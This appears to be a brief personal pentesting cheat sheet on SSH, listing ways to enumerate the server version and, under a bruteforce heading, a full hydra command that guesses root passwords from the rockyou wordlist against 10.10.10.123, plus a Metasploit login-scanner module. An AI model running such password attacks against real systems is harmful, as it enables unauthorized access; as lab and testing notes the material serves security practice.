# SSH

## enumeration

- try to get the version (nmap scripts...)
- try to login, see if there's a banner (to get the ssh version)

## bruteforce

- `hydra -l root -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt 10.10.10.123 ssh`
- msfconsole: auxiliary/scanner/ssh/ssh_login
